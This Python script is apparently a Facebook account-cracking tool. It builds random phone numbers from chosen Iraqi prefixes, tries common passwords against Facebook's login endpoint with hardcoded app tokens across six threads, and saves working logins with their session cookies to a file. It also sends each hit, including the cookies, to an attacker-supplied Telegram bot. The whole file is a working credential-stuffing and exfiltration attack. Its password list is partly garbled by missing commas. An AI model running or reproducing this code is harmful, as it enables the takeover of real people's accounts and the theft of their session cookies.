import requests
import json,time
from user_agent import generate_user_agent as ua
import os
import bs4
import random
import webbrowser
import sys
from datetime import datetime

#==[COLORS]==#
FB_BG   = '\033[48;5;21m'    # خلفية زرقاء فيسبوك
FB_W    = '\033[38;5;15m'    # أبيض
FB      = '\033[38;5;33m'    # أزرق فيسبوك
FB_LINE = '\033[38;5;99m'    # بنفسجي للخط
PURPLE  = '\033[1;35m'       # بنفسجي قوي
W       = '\033[1;37m'
G       = '\033[1;32m'
R       = '\033[1;31m'
Z       = '\033[1;31m'
X       = '\033[1;33m'
F       = '\033[2;32m'
S       = '\033[2;36m'
RST     = '\033[0m'

#==[VARS]==#
version = '3.0'
__date__ = datetime.now().strftime('%Y-%m-%d')
xlinex = f"{FB_LINE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{W}"
xpxx   = f"{W}>{G}>{W}>{G}"
xp     = f"{FB}<[{W}●{FB}]>{W}"

CP=0
GD=0
BD=0
loop=0

time.sleep(4)
os.system('clear')

#==[LOGO]==#
Logo = f"""{xlinex}

{FB_BG}{FB_W}         ██████  {RST}
{FB_BG}{FB_W}         ██      {RST}
{FB_BG}{FB_W}         ██      {RST}
{FB_BG}{FB_W}         █████   {RST}
{FB_BG}{FB_W}         ██      {RST}
{FB_BG}{FB_W}         ██      {RST}
{FB_BG}{FB_W}         ██      {RST}

{xlinex}
{W}  DEVELOPER {xpxx} Zeus{G}-{W}
{W}  STATUS    {xpxx} Premium
{W}  VERSION   {xpxx} V{G}/{W}{version}
{xlinex}
{R}⫷⫸ 𝐷𝐸𝑉 Zeus| @R7_36{W}
{xlinex}
{xp} FUTURES  {xpxx} FILE{G}〤{W}CLONE
{xp} DEV {xpxx} Zeus ~ @R7_36
{xp} TODAYS   {xpxx} {__date__}
{xlinex}"""

print(Logo)
Token=input(f'{S} Enter TOKEN:{Z}')
ID=input(f'{S} Enter ID:{Z}')

# ============ كود البلد ============#
print(f'\n{PURPLE}  ')
print(f'{PURPLE}  │  {W}0751  0770  0780  0750  {PURPLE}       │')
print(f'{PURPLE}  {RST}')
sim = input(f'{PURPLE}  Choose Code: {RST}').strip()

os.system('clear')
print(Logo)
print(f"{FB_LINE}{'-'*56}{W}")
print(f"{PURPLE}  Code Selected: {W}{sim}{RST}")
print(f"{FB_LINE}{'-'*56}{W}")
ti=str(time.time()).split('.')[0]

#==[PASSWORDS]==#
PASSWORDS = [
    '123456', '123456789', '12345678', '12345', '1234567',
    'password', 'qwerty', '123123', '111111', '1234567890',
    '1234', '1q2w3e', 'abc123', 'admin', 'qwerty123',
    'iloveyou', '000000', '654321', '121212', '123321',
    '666666', '888888', '555555', '777777', 'letmein',
    'welcome', 'monkey', 'dragon', 'master', 'shadow',
    'football', 'sunshine', 'princess', 'superman', 'michael',
    '987654321', '1qaz2wsx', 'asdfghjkl', '1q2w3e4r', 'qwertyuiop',
    '112233', '159753', '147258369', '123abc', 'password1',
    'passw0rd', '1q2w3e4r5t', 'abcd1234', 'zaq12wsx', '87654321'
                    "hama1234",
                "zaxo1234",
                "zaxozaxo",
                "kurd1234",
                "muhamad123",
                "kurdkurd",
                'ow9uz8h13'
                'iwoih351335'
                '123456789'
                '123456'
                '12345678'
                'abc123'
                'password'
                'admin'
                'welcome'
                'welcome'
                'monkey'
                '1234567'
                'admin'
                'iloveyou'
                'abc123'
                '123456789'
                '12345678'
                '123456'
                'princess'
                'iloveyou'
              '1234'
             '121212'
        'hello'
        'whatever'
        'abc123'
        'qwerty123'
        'welcome'
        'login'
        'passw0rd'
        'baseball'
         '123456789'
'123456'
'12345678'
'1234567'
'abc123'
'1q2w3e4r'
  'iloveyou'         
'admin'
'welcome'
'121212'
 '696969''hamahama', '١٢٣٤٥٦٧٨٩', 'hama1234', 'zaxozaxo', 'zaxo1234',
                   '١٢٣٤٥٦', 'kurdkurd', 'kurd1234', '07500750''zaxozaxo', 'kurd1234', '١٢٣٤٥٦٧٨٩', 'hama1234',
                          '١٢٣٤٥٦', 'zaxozaxozaxi', 'zaxo12345', '١٢٣٤٥٦٧٨', '١٢٣٤٥٦٧''zaxozaxo','kurd1234','١٢٣٤٥٦٧٨٩','hama1234','١٢٣٤٥٦','zaxozaxozaxi','zaxo12345','١٢٣٤٥٦٧٨','١٢٣٤٥٦٧'
]

def login():
	global GD,CP,BD,loop
	while True:
		u = ''.join(random.choice('1234567890') for i in range(7))
		domin = sim + u
		pas=random.choice(PASSWORDS)
		locales =random.choice(["ar_EG","en_US","en_GB","fr_FR", "es_ES","ar_SA","ar_MA", "ar_AE","en_CA", "en_AU","de_DE","it_IT","tr_TR","id_ID","pt_BR","ru_RU"])
		tokens =random.choice(['257637621624717|7e73d6961c0c8fab39f62afdfb77f96b','350685531728|62f8ce9f74b12f84c123cc23437a4a32','882a8490361da98702bf97a021ddc14d'])
    
		payload = {
		  "locale":locales,
		  "format": "json",
		  "email": domin,
		  "password": f"#PWD_REACTNATIVE:0:{ti}:{pas}",
		  "access_token":tokens,
		  "generate_session_cookies": 1
		}
		
		headers = {
		  'User-Agent':str(ua()),
		  'Accept-Encoding': "gzip",
		  'Content-Type': "application/json",
		  'content-type': "application/json;charset=utf-8"
		}
		url = "https://graph.facebook.com/auth/login"
		
		loop += 1
		sys.stdout.write(f'\r\033[K{FB}[@R7_36]{W} [OK/CP/BD] [{GD}/{CP}/{BD}] [loop: {loop}]')
		sys.stdout.flush()
		
		time.sleep(random.uniform(0.3, 1))
		
		try:
			resp_obj = requests.post(url, data=json.dumps(payload), headers=headers, timeout=10)
			response = resp_obj.text
			cookies = resp_obj.cookies.get_dict()
		except:
			response = ""
			cookies = {}
		
		if 'c_user' in response:
			GD+=1
			cookie_str = '; '.join(f"{k}={v}" for k, v in cookies.items())
			sys.stdout.write(f'\r\033[K{F}[@R7_36-OK]  {domin}  |  {pas}\n')
			sys.stdout.flush()
			if cookie_str:
				sys.stdout.write(f'\033[K{F}[COOKIES] {cookie_str}\n')
				sys.stdout.flush()
			with open('OK.txt','a') as g:
				g.write(domin + '|' + pas + '|' + cookie_str + '\n')
			
			msg = f"""حساب شغال✅
     

❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {domin}
❖ - 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃 : {pas}
❖ - 𝐂𝐎𝐎𝐊𝐈𝐄𝐒 : {cookie_str}

ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
DEV :: @R7_36 ~ Zeus
 trust » https://t.me/R7Aih1
 ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ"""
			try:
				requests.post(
					f"https://api.telegram.org/bot{Token}/sendMessage",
					data={"chat_id": ID, "text": msg},
					timeout=10
				)
			except:
				pass
			
			time.sleep(random.uniform(1, 2))
		elif 'two_step' in response:
			CP+=1
			sys.stdout.write(f'\r\033[K{F}[@R7_36-CP]  {domin}  |  {pas}\n')
			sys.stdout.flush()
			with open('CP.txt','a') as c:
				c.write(domin + '|' + pas + '\n')
			
			msg = f"""حساب سكيور ❌
     

❖ - 𝐔𝐒𝐄𝐑𝐍𝐀𝐌 : {domin}
❖ - 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃 : {pas}

ـــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ
DEV :: @R7_36 ~ Zeus
 trust » https://t.me/R7Aih1
 ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ"""
			try:
				requests.post(
					f"https://api.telegram.org/bot{Token}/sendMessage",
					data={"chat_id": ID, "text": msg},
					timeout=10
				)
			except:
				pass
			
			time.sleep(random.uniform(1, 2))
		else:
			BD+=1
			time.sleep(random.uniform(0.3, 1))

from threading import Thread

for i in range(6):
	Thread(target=login, daemon=True).start()

while True:
	time.sleep(1)
